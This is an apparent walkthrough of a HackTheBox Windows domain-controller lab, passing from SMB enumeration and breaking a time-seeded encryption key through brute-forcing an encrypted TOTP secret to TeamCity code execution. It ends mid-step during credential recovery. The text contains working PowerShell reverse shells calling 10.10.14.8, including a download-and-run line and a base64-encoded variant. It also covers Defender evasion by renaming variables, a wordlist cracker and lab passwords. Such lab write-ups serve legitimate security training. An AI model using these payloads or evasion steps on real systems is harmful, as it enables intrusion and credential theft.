## Initial Enumeration

#### Open Ports

```bash
# Nmap 7.94 scan initiated Sun Dec 10 14:02:57 2023 as: nmap -Pn -sCV -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49677,49686,49687,49690,49702,49707,49713 -oN nmap/tcp 10.10.11.207
Nmap scan report for 10.10.11.207
Host is up (0.23s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-11 03:02:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2023-12-11T03:04:05+00:00; +7h59m40s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2023-12-11T03:04:05+00:00; +7h59m40s from scanner time.
|_http-title: IIS Windows Server
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Not valid before: 2022-11-04T17:25:43
|_Not valid after:  2032-11-01T17:25:43
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-11T03:04:03+00:00; +7h59m40s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-12-11T03:04:05+00:00; +7h59m40s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2023-12-11T03:04:03+00:00; +7h59m40s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m40s, deviation: 0s, median: 7h59m39s
| smb2-time: 
|   date: 2023-12-11T03:03:50
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 10 14:04:26 2023 -- 1 IP address (1 host up) scanned in 88.53 seconds

```

The open ports indicate this is a Windows Domain Controller. Ports 135, 139, and 445 are common ports on Windows for RPC and SMB. DNS on 53, LDAP on 389 and 636, and Kerberos on 88 are all ports commonly open on Active Directory Domain Controllers. Nmap's scripts also reveal the computer name DC01. Ports 80 and 443 reveal the machine to be a web server hosting Microsoft IIS.

Let's add the machine's host name to our /etc/hosts file:

![](Images/Pasted%20image%2020231210142331.png)

Since we are dealing with Kerberos, a time critical protocol, let's sync our time to the machine:

`sudo ntpdate 10.10.11.207`

Make sure to stop your ntp service before running the command.

#### SMB

Using CrackMapExec to enumerate shares:

`cme smb 10.10.11.207 -u random -p '' --shares`

![](Images/Pasted%20image%2020231210223805.png)

The server appears to allow anonymous authentication. There are two non-standard shares with which we have read access. CrackMapExec's spider_plus module maps every readable share's folders and files to a JSON file. Using jq, we are able to parse this document for any potentially useful files:

`cat 10.10.11.207.json | jq '.Development | keys[]'`

`cat 10.10.11.207.json | jq '.Users | keys[]'`

Nothing of importance found in the Users share. Development share contains `Migrations/adcs_reporting` and `Migrations/teamcity_test_repo` folders with git repositories. There is also a `Temporary Projects` folder with an Encrypter.exe and s.blade.enc. With smbclient, we can use mget to retrieve all three folders for further analysis later.

#### HTTP(S)

Inspecting the web page returns Microsoft IIS default homepage.

![](Images/Pasted%20image%2020231211020414.png)

No virtual hosts or subdirectories were discovered.


## Encrypter.exe

Running `file Encrypter.exe` reveals the executable to be a .NET assembly. The C# programming language, alongside other .NET programming languages, aren't compiled into machine code like traditional low level programming languages like C/C++. It is instead compiled into an Intermediate Language (IL) and is only fully compiled into machine code at runtime. This Intermediate Language is able to be decompiled into something very close to its original source code.

There are plenty of tools that are able to decompile .NET assembly to its original source code, such as dnSpy and ILSpy. I opted to use the ilspy extension within visual studio code:

![](Images/Pasted%20image%2020231211042122.png)

Looking through the source code, we are able to see that Encrypter program takes a file and AES encrypts it, creating a new file with a .enc extension. It's encryption key and iv are chosen at the time of encryption, using the current time as the seed for C#'s Random class:

![](Images/Pasted%20image%2020231211194044.png)

This block of code presents two problems. The Random class is not truly random. It is a pseudo-random generator. It's "randomness" comes from a deterministic algorithm that generates based on a provided seed. If the seeds provided are unique, the provided output will be sufficiently random for all practical purposes. However, if a seed is discovered and reused, the algorithm will produce the same output. That leads us to our second problem. The use of ToUnixTimeSeconds() for the seed.

The use of the system time for the seed of a pseudo-random number generator is a fairly common practice. This is not a problem if the time at generation is not easily identifiable. However, we are able to see the file's time stamps in the SMB share:

![](Images/Pasted%20image%2020231212050732.png)

These timestamps are in the json file created by CrackMapExec's spider_plus module we ran earlier. The mtime here is likely the time the file was created. The size of the encrypted file is very small. It is highly likely it took less than a second for the Encrypter program to encrypt and write the file. The use of time again wouldn't be a problem as system time is capable of using 100-nanosecond time increments known as ticks, which would be different between the establishment of the DateTimeOffset and the writing of the encrypted file. However, the programmer used ToUnixTimeSeconds(). This limits the DateTimeOffset value to the second. ToUnixTimeMilliseconds() would have been a more secure choice for this program.

We have everything we need to generate the same seed the program used. Now that we can generate it, we can also generate the correct key and iv to decrypt the file. I modified the code into a Decrypter program for this purpose:

```csharp
using System;
using System.IO;
using System.Security.Cryptography;

internal class AES
{
    public static void Main(string[] args)
    {
        if (args.Length != 1)
        {
            Console.WriteLine("You must provide the name of a file to encrypt.");
            return;
        }

		//Change the file extension from '.enc' to '.dec'
        FileInfo fileInfo = new FileInfo(args[0]);
        string destFile = Path.ChangeExtension(fileInfo.Name, ".dec");

		//Use timestamp from s.blade.enc file to set DateTimeOffset value for seed.
        long value = new DateTimeOffset(2022, 11, 11, 17, 17, 08, new TimeSpan(-5, 0, 0)).ToUnixTimeSeconds();

		//Use seed to generate iv and key, then run Decrypt function.
        Random random = new Random(Convert.ToInt32(value));
        byte[] iv = new byte[16];
        random.NextBytes(iv);
        byte[] key = new byte[32];
        random.NextBytes(key);
        DecryptFile(fileInfo.Name, destFile, key, iv);
    }

    private static byte[] DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
    {
	    //Use nested using statements to ensure all filestreams are properly closed and disposed of.
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
	        //Creates output FileStream for our decrypted output.
            using (FileStream stream = new FileStream(destFile, FileMode.Create))
            {
	            //Establish Decryptor object
                using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(Key, IV))
                {
	                //Creates stream for decryptions. Writes to output FileStream.
                    using (CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write))
                    {
	                    //Creates input FileStream for our encrypted file input.
                        using (FileStream fileStream = new FileStream(sourceFile, FileMode.Open))
                        {
	                        //While loop to decrypt input FileStream.
                            byte[] array = new byte[1024];
                            int count;
                            while ((count = fileStream.Read(array, 0, array.Length)) != 0)
                            {
                                cryptoStream.Write(array, 0, count);
                            }
                        }
                    }
                }
            }
        }
        return null;
    }
}
```

I compiled and ran the program with mono. The program spat out `s.blade.dec`:

![](Images/Pasted%20image%2020231212063743.png)

`7z l s.blade.7z`
![](Images/Pasted%20image%2020231212105836.png)

The decrypted file is a 7-zip archive containing a KeePass database and what appears to be it's associated key.

KeePass is a secure open source password manager. It's databases are encrypted with a master key. Most commonly this key is derived from a password, a keyfile, or both.

If you have KeePass or KeePassXC, you can use either program to access this database with a gui interface. I opted to use kpcli to open it from the terminal. Providing the key file with no password was a success:

`kpcli --kdb=s.blade.kdbx --key=.key`
![](Images/Pasted%20image%2020231212161311.png)

The database provides us with two passwords and an encrypted authenticator secret. We also get a subdomain we can add to /etc/hosts.

![](Images/Pasted%20image%2020231212161524.png)
![](Images/Pasted%20image%2020231212161553.png)
![](Images/Pasted%20image%2020231212161626.png)

The O365 credentials from the database provide us with valid domain credentials. We are ale to use these credentials to get a list of users from CrackMapExec:

`cme smb dc01.coder.htb -u s.blade -p AmcwNO60Zg3vca3o0HDrTC6D --users`
![](Images/Pasted%20image%2020231213022901.png)

We are also able to use these credentials with BloodHound.

Didn't have any success kerberoasting and wasn't able to find any path forward with s.blade in BloodHound. Discovered user e.black was a member of the Remote Management Users and PKI Admins groups. PKI Admins is not a default Windows group, but the name indicates that it is probably associated with Active Directory Certificate Services (ADCS). ADCS is a very common attack/privilege escalation vector on Active Directory networks. Not useful now, but something to think about later. For now, onto the subdomain.


## Two-Factor Authentication

Upon navigating to the url from the database, we are immediately greeted with a login screen:

![](Images/Pasted%20image%2020231213024742.png)

Followed immediately by 2FA:

![](Images/Pasted%20image%2020231213024846.png)

Most two-factor authentication methods utilize what's called a one-time password (OTP). OTPs are six-digit codes that are generated from a deterministic algorithm that takes two inputs, a static seed or secret, and a moving factor. This moving factor can be a counter that increments with every request such as through HOTP (HMAC-based OTP), or it can be time-based in the case of TOTP (Time-based OTP). According to the database, we are dealing with totp and we have the encrypted secret.

![](Images/Pasted%20image%2020231213030903.png)

If we can find a way to decrypt the secret, we can generate our own code to authenticate through 2FA. FIrst step is to figure out how the secret is encrypted.

Through some googling I found a github repository for what could potentially be the same authenticator app s.blade uses/

![](Images/Pasted%20image%2020231213035216.png)

I verified this by installing it as a firefox extension and adding a test code. I then created a password protected backup file through the extension.

![](Images/Pasted%20image%2020231213035454.png)
![](Images/Pasted%20image%2020231213035553.png)

Looks like the same output format to me.

Now that we have the source code in front of us, let's see if we can figure out the secret. If the output above is from a backup, there must be a way to import, too. And the program must have a way to decrypt. I was able to find `src/import.ts`. In the code exists a decryptBackupData function.

```typescript
export function decryptBackupData(
  backupData: { [hash: string]: OTPStorage },
  passphrase: string | null
) {
  const decryptedbackupData: { [hash: string]: OTPStorage } = {};
  for (const hash of Object.keys(backupData)) {
    if (typeof backupData[hash] !== "object") {
      continue;
    }
    if (!backupData[hash].secret) {
      continue;
    }
    if (backupData[hash].encrypted && !passphrase) {
      continue;
    }
    if (backupData[hash].encrypted && passphrase) {
      try {
        backupData[hash].secret = CryptoJS.AES.decrypt(
          backupData[hash].secret,
          passphrase
        ).toString(CryptoJS.enc.Utf8);
        backupData[hash].encrypted = false;
      } catch (error) {
        continue;
      }
    }
    // backupData[hash].secret may be empty after decrypt with wrong
    // passphrase
    if (!backupData[hash].secret) {
      continue;
    }
    decryptedbackupData[hash] = backupData[hash];
  }
  return decryptedbackupData;
}
```

The function is passed two parameters, backupData and passphrase. backupData appears to be an index of all the keys and values from the json backup file. If the encrypted key is set to true and the passphrase parameter is present, then it runs the encrypted secret through a CryptoJS AES decrypt function using the passphrase parameter as the decryption key. This file only establishes the function. Let's see if we can find where it is called to figure out the passphrase.

I found the function being called in `src/components/Import/FileImport.vue`.

```typescript
if (importData.hasOwnProperty("key")) {
            if (importData.key) {
              key = importData.key;
            }
            delete importData.key;
          } else if (importData.enc && importData.hash) {
            key = { enc: importData.enc, hash: importData.hash };
            delete importData.hash;
            delete importData.enc;
          }

          let encrypted = false;
          for (const hash in importData) {
            if (importData[hash].encrypted) {
              encrypted = true;
              try {
                const oldPassphrase:
                  | string
                  | null = await this.getOldPassphrase();

                if (key) {
                  decryptedFileData = decryptBackupData(
                    importData,
                    CryptoJS.AES.decrypt(key.enc, oldPassphrase).toString()
                  );
                } else {
                  decryptedFileData = decryptBackupData(
                    importData,
                    oldPassphrase
                  );
                }
```

With this code, if the "enc" and "hash" keys are present in the file, the decryptBackupData function is called. The program calls CryptoJS to decrypt the "enc" field using oldPassphrase as the key. It then passes the decrypted "enc" field as the passphrase parameter to the decryptBackupData function. The oldPassphrase variable is the value returned by the getOldPassphrase() function. Looking around the file, it seems that function returns whatever password the user inputs from a prompt.

We have the necessary information. We can probably code a brute-forcer that uses a wordlist to find the password by attempting to decrypt "enc", and then using that as the key to decrypt the secret.

This should be standard AES CBC, so any programming language should do, but since the app uses CryptoJS, let's use it as well and go with JavaScript. We'll use NodeJS.

First we install the crypto-js module with `npm install crypto-js`. Then back to vscode to create our program.

```javascript
const CryptoJS = require('crypto-js')

const encryptedSecret = 'U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2'
const enc = 'U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1'

let key = CryptoJS.AES.decrypt(enc, 'test').toString()
let secret = CryptoJS.AES.decrypt(encryptedSecret, key).toString(CryptoJS.enc.Utf8)

console.log(secret)
```

This will be our main decryption function. We will replace the string test with the words from our wordlist. We will use rockyou.txt. We will use Node's `readline` module to go through rockyou one line at a time. We also need to identify a valid secret. The standard for OTP secrets is to be encoded in base32, so I am using regex to filter for any base32. Base32 encoding has a minimum length of 8 characters. `[A-Z2-7=]{8,}`

```javascript
const CryptoJS = require(crypto-js)
const readline = require(readline)
const fs = require(fs)

const encryptedSecret = 'U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2'
const enc = 'U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1'
const rockyou = fs.createReadStream('/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt')

let rl = readline.createInterface(rockyou)
rl.on('line', (password) => {
    
    let key = CryptoJS.AES.decrypt(enc, password).toString()
    let secret = CryptoJS.AES.decrypt(encryptedSecret, key).toString(CryptoJS.enc.Utf8)

    if (secret.match(/[A-Z2-7=]{8,}/)) {
        
        console.log(secret)
        rl.close()

    }

})
```

When we try to run this code, we get a Malformed UTF-8 error:

![](Images/Pasted%20image%2020231214221036.png)

AES decryption will take place regardless of the key provided. This error is likely due to the decrypted output not being able to be parsed as UTF-8. When the nodejs runtime throws an error, it crashes and halts the program. We can catch these errors to allow the program to continue. Let's also add output to the program so we can see it cycle through the words. This will be purely aesthetic. It is not necessary for the code to function.

```javascript
const CryptoJS = require(crypto-js)
const readline = require(readline)
const fs = require(fs)
const process = require(process)

//Set variables and establish wordlist
const encryptedSecret = 'U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2'
const enc = 'U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1'
const rockyou = fs.createReadStream('/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt')

//Use readline to loop through wordlist
let rl = readline.createInterface(rockyou)
rl.on('line', (password) => {

	//Use try..catch to catch errors and continue operation
    try {

        //Cycle through words on screen. Purely aesthetic.
        process.stdout.clearLine()
        process.stdout.write('\r' + password)

        //Attempt to crack secret
        let key = CryptoJS.AES.decrypt(enc, password).toString()
        let secret = CryptoJS.AES.decrypt(encryptedSecret, key).toString(CryptoJS.enc.Utf8)
        
        //If valid base32 is found, will print password and secret to screen
        if (secret.match(/[A-Z2-7=]{8,}/)) {

            process.stdout.clearLine()
            console.log('\r' + password +  ':'  + secret)
            rl.close()

        }

    } catch {

        //Do nothing with the caught error

    }

})
```

Success!

![](Images/Pasted%20image%2020231214224422.png)

We can either use the secret to generate the otp, or we can import the backup from the keepass database and plugin the password into the authenticator extension. Whichever you choose we now have the code to authenticate to the webserver.

![](Images/Pasted%20image%2020231215065359.png)
![](Images/Pasted%20image%2020231215065452.png)


*Side note: It is generally considered bad programming practice to do nothing with caught errors like that. If you are going to use try and catch, you should do something with the errors you catch. But for the purposes of this small single-purpose program, it is fine and it served its purpose.*

*Second note: If you haven't synced your time with the server yet, you will need to do it now. As TOTP is time based, the time between the client and server have to match if you want the OTP to match.*


## TeamCity

TeamCity is a Continuous Integration Continuous Development (CI/CD) environment by JetBrains. As a CI/CD environment, it allows for the development and testing of various programming languages. Let's see if we can find any way for Remote Code Execution.

Browsing the webapp, There is a Development_Testing project with a single build configuration. Running the build seems to execute a Hello World powershell script.

![](Images/Pasted%20image%2020231215070903.png)
![](Images/Pasted%20image%2020231215070927.png)
![](Images/Pasted%20image%2020231215071027.png)

I don't see a way for us to create our own build, but we might be able achieve code execution through modifying the build with a diff patch.

![](Images/Pasted%20image%2020231215231834.png)
![](Images/Pasted%20image%2020231215231348.png)
![](Images/Pasted%20image%2020231215232009.png)

The current build configuration executes a script named hello_word.ps1. One of the git repositories in the smb share was for a teamcity_test_repo with a hello_world.ps1. We can generate a diff file to change execution from a simple Hello World script to a reverse shell.

I opted to use ConPtyShell for my reverse shell. I typed up a script for it.

```powershell
IEX(IWR http://10.10.14.8/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 8443
```

I then ran `diff -u hello_world.ps1 rev.ps1 | sed 's/rev.ps1/hello_world.ps1/g'` to generate a diff file.

```diff
--- hello_world.ps1     2023-12-15 23:21:17.720538874 -0500
+++ hello_world.ps1     2023-12-15 23:35:13.282295297 -0500
@@ -1,2 +1 @@
-#Simple repo test for Teamcity pipeline
-write-host "Hello, World!"
+IEX(IWR http://10.10.14.8:443/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 8443
```

The purpose of the sed command is to ensure the file retains its original name. Without it, the diff changes the name from hello_world.ps1 to rev.ps1. The build will still try to execute hello_world because that's what it is configured to do, and it will fail because the file no longer exists as it was renamed.

After uploading and executing the patch, ConPtyShell didn't execute due to Windows Defender.

![](Images/Pasted%20image%2020231216000321.png)

I decided to go with a simpler reverse shell to bypass AV. I used a modified Nishang one-liner.

```powershell
#Original
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.8',8443);$stream = $client.GetStream();[byte[)$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
```powershell
#Modified
$c = New-Object System.Net.Sockets.TCPClient('10.10.14.8',8443);$s = $c.GetStream();[byte[)$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$se = (iex $d 2>&1 | Out-String );$se2  = $se + (Get-Location) + '> ';$sen = ([text.encoding]::ASCII).GetBytes($se2);$s.Write($sen,0,$sen.Length);$s.Flush()};$c.Close()
```

Windows Defender is primarily signature based. It gets a lot of its signatures from strings. The default Nishang PowerShell one-liner is signatured. To bypass these signatures, I changed all the variable names to 1 or 2 letter names. I also got rid of the `'PS '` text in the prompt. `(pwd).Path`, which is what displays your current directory in the prompt, is also signatured and triggers Defender. I replaced it with `(Get-Location)`. This will also display your current directory in the shell prompt. After applying the patch, the new shell was successful. However, the connection was interrupted after a couple of minutes. There is probably a timeout. I'll set the shell to run as a process in the background.

```diff
--- hello_world.ps1	2023-12-15 23:21:17.720538874 -0500
+++ hello_world.ps1	2023-12-16 02:19:47.627203412 -0500
@@ -1,2 +1 @@
-#Simple repo test for Teamcity pipeline
-write-host "Hello, World!"
+Start-Process powershell -ArgumentList '-nop -w hidden -exec bypass -enc JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAxADAALgAxADQALgA4ACcALAA4ADQANAAzACkAOwAkAHMAIAA9ACAAJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAC4AUgBlAGEAZAAoACQAYgAsACAAMAAsACAAJABiAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAkAHMAZQAgAD0AIAAoAGkAZQB4ACAAJABkACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlADIAIAAgAD0AIAAkAHMAZQAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkAIAArACAAJwA+ACAAJwA7ACQAcwBlAG4AIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQAyACkAOwAkAHMALgBXAHIAaQB0AGUAKAAkAHMAZQBuACwAMAAsACQAcwBlAG4ALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQAKAA=='
```

`Start-Process` is used to run a separate PowerShell process in the background. `-ArgumentList` specifies the arguments provided to the process. The base64 in the command is just the above reverse shell base64 encoded. Windows uses UTF-16 Little Endian for its text encoding. Linux uses UTF-8. Before base64 encoding any PowerShell commands from a Linux machine, you need to convert the encoding with `iconv`

`iconv -t UTF-16LE <powershell script file> | base64 -w0`

The output of the above command is what gets passed to PowerShell for successful execution. We apply the patch one more time for a successful callback that does not timeout on us.

![](Images/Pasted%20image%2020231217092616.png)


*Note: The Nishang reverse shell we used is very simple. There are a lot of limitations as a result. For instance there is no command history. There is no tab autocompletion. And errors are not printed to screen. ConPtyShell would have given us a proper shell with all three of those problems fixed. We could have modified the signatures of ConPtyShell in a similar way to bypass AV. However, I decided to hold off on using ConPtyShell for now and use it later to describe other AV evasion methods. After rooting the box I intend to include an additional section on more in-depth AV/AMSI evasion techniques to get ConPtyShell running.*


## On The Box - Initial Access

Our foothold on the machine is as the user `svc_teamcity`

![](Images/Pasted%20image%2020231221024928.png)

`svc_teamcity` is likely the service account used for running the webserver. Listing the `C:\Users` directory reveals the other user on the box to be `e.black`.

![](Images/Pasted%20image%2020231221025458.png)

Our earlier BloodHound enumeration revealed `e.black` to be able to use WinRM and to be a member of the PKI Admins group. WinRM would be useful for getting a more stable shell on the box, but I'm really interested in the potential permissions of the PKI Admins group. Since we are the service account for the TeamCity server, let's see if we can access the TeamCity database. We might be able to get the credentials for `e.black`.

Looking around the TeamCity directory, I was unable to find a database. Checking documentation, I found information about the database.

![](Images/Pasted%20image%2020231222042813.png)

Whether an internal or external database is used, valuable data is likely to be in the `<TeamCity Data Directory>`. Let's see if we can figure out the directory. We'll also check to see if the website is using an internal or external database while we are at it.

![](Images/Pasted%20image%2020231222043146.png)
`Get-Content teamcity-server.log | Select-String SQL`
![](Images/Pasted%20image%2020231222043500.png)

The above output reveals the server appears to be using the internal database.

![](Images/Pasted%20image%2020231222051950.png)
![](Images/Pasted%20image%2020231222052036.png)
![](Images/Pasted%20image%2020231222052251.png)

And it looks like the data directory is in `C:\ProgramData\JetBrains\TeamCity`. I found the e.black hash in the `buildserver.data` database file under the system directory.

![](Images/Pasted%20image%2020231222054146.png)
`Get-Content buildserver.data | Select-String black`
![](Images/Pasted%20image%2020231222054417.png)

Unfortunately I wasn't able to crack the hash. Let's see what else we can find in the `system` directory.

`Get-ChildItem -Recurse | Select-String e.black`
![](Images/Pasted%20image%2020231222062645.png)

It looks like there is a diff file with a PSCredential Object. Let's check out the entire file and see what's going on

```diff
diff --git a/Get-ADCS_Report.ps1 b/Get-ADCS_Report.ps1
index d6515ce..a990b2e 100644
--- a/Get-ADCS_Report.ps1
+++ b/Get-ADCS_Report.ps1
@@ -77,11 +77,15 @@ Function script:send_mail {
     [string]
     $subject
   )
+
+$key = Get-Content ".\key.key"
+$pass = (Get-Content ".\enc.txt" | ConvertTo-SecureString -Key $key)
+$cred = New-Object -TypeName System.Management.Automation.PSCredential ("coder\e.black",$pass)
 $emailFrom = 'pkiadmins@coder.htb'
 $emailCC = 'e.black@coder.htb'
 $emailTo = 'itsupport@coder.htb'
 $smtpServer = 'smtp.coder.htb'
-Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High
+Send-MailMessage -SmtpServer $smtpServer -To $emailTo -Cc $emailCC -From $emailFrom -Subject $subject -Body $message -BodyAsHtml -Priority High -Credential $cred
 }


diff --git a/enc.txt b/enc.txt
new file mode 100644
index 0000000..d352634
--- /dev/null
+++ b/enc.txt
@@ -0,0 +1,2 @@
+76492d1116743f0423413b16050a5345MgB8AGoANABuADUAMgBwAHQAaQBoAFMAcQB5AGoAeABlAEQAZgBSAFUAaQBGAHcAPQA9AHwANABhADcANABmAGYAYgBiAGYANQAwAGUAYQBkAGMAMQBjADEANAAwADkAOQBmADcAYQBlADkAMwAxADYAMwBjAGYAYwA4AGYAMQA3ADcAMgAxADkAYQAyAGYAYQBlADAAOQA3ADIAYgBmAGQAN
+AA2AGMANQBlAGUAZQBhADEAZgAyAGQANQA3ADIAYwBjAGQAOQA1ADgAYgBjAGIANgBhAGMAZAA4ADYAMgBhADcAYQA0ADEAMgBiAGIAMwA5AGEAMwBhADAAZQBhADUANwBjAGQANQA1AGUAYgA2AGIANQA5AGQAZgBmADIAYwA0ADkAMgAxADAAMAA1ADgAMABhAA==
diff --git a/key.key b/key.key
new file mode 100644
index 0000000..a6285ed
--- /dev/null
+++ b/key.key
@@ -0,0 +1,32 @@
+144
+255
+52
+33
+65
+190
+44
+106
+131
+60
+175
+129
+127
+179
+69
+28
+241
+70
+183
+53
+153
+196
+10
+126
+108
+164
+172
+142
+119
+112
+20
+122
```

This looks like a diff patch applied to Get-ADCS_Report.ps1, which was in the other git repository from the SMB share we grabbed earlier. This was probably executed as a personal build by `e.black` much in the same way we executed our reverse shell as a diff patch.

Looking at the diff file, we have `enc.txt`, which is an encrypted standard string, and the key that was used to create it. Encrypted standard strings are generated from SecureStrings. SecureStrings are what PowerShell uses to pass sensitive data such as passwords to various cmdlets and functions, including Credential objects.

With the encrypted standard string and the key, we can follow the diff file to convert the encrypted standard string to a SecureString and create a PSCredential object. We can then convert that object to a NetworkCredential object. With NetworkCredential we can get the original clear text password.

First let's get the key and `enc.txt` values into variables. The key file looks like a list of numbers, but that's just how PowerShell presents raw bytes. PowerShell displays them in decimal instead of hexadecimal.

`$ echo -n '<copied key from diff file>' | sed 's/^\+//g' | tr '\n' ','`

The above command was done on our Linux machine to format the key a little better for declaring as a variable in PowerShell

